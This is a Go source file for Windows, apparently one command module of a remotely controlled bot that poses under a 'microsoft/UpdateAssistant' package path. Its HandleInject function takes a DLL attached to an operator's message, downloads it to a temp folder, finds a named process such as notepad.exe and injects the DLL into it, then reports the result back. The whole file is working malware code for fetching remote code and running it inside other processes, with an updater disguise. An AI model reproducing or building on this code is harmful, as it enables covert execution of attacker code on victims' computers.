//go:build windows

package system

import (
	"fmt"
	"os"
	"path/filepath"

	ipc "github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/files"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

var injectUsage = []string{
	"inject <process.exe> — inject an uploaded DLL into the target process",
	"upload a .dll file then run: .inject notepad.exe",
}

func HandleInject(c *ipc.Context) error {
	if len(c.Attachments) == 0 {
		return c.Usage(injectUsage)
	}
	if len(c.Args) == 0 {
		return c.Usage(injectUsage)
	}
	target := c.Args[0]

	pid, err := loader.FindProcessPID(target)
	if err != nil {
		return c.Reply(fmt.Sprintf("could not find process %q: %v", target, err))
	}

	data, name, err := files.Download(c.Attachments[0])
	if err != nil {
		return c.Reply("download failed: " + err.Error())
	}

	tmpDir := filepath.Join(os.TempDir(), "inject")
	os.MkdirAll(tmpDir, 0755)
	dllPath := filepath.Join(tmpDir, name)
	if err := os.WriteFile(dllPath, data, 0644); err != nil {
		return c.Reply("write failed: " + err.Error())
	}

	if err := loader.InjectFile(pid, dllPath); err != nil {
		return c.ReplyEmbed(ipc.Error(fmt.Sprintf("inject into %s (pid %d) failed: %v", target, pid, err)))
	}

	return c.ReplyEmbed(ipc.Success(fmt.Sprintf("injected %s into %s (pid %d)", filepath.Base(name), target, pid)))
}
